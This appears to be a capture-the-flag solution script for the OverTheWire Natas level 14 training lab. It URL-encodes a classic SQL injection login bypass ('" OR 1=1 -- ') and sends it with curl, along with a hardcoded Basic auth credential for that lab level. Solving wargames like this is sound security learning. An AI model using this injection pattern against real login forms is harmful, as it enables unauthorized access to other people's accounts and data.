#! /bin/bash

rawurlencode() {
  local string="${1}"
  local strlen=${#string}
  local encoded=""
  local pos c o

  for (( pos=0 ; pos<strlen ; pos++ )); do
     c=${string:$pos:1}
     case "$c" in
        [-_.~a-zA-Z0-9] ) o="${c}" ;;
        * )               printf -v o '%%%02x' "'$c"
     esac
     encoded+="${o}"
  done
  echo "${encoded}"    # You can either set a return variable (FASTER) 
  REPLY="${encoded}"   #+or echo the result (EASIER)... or both... :p
}

#
# our SQL injection is USERNAME="test_username" OR 1=1 -- " which will
# hopefully result in the following SQL query
#
# SELECT * from users where username="test_username" or 1=1 -- " and password="test_password"
#
export USERNAME="$( rawurlencode 'test_username" OR 1=1 -- ' )"

curl "http://natas14.natas.labs.overthewire.org/index.php?username=$USERNAME&password=test_password&debug" \
  -H 'Authorization: Basic bmF0YXMxNDpMZzk2TTEwVGRmYVB5VkJrSmRqeW1ibGxRNUw2cWRsMQ=='
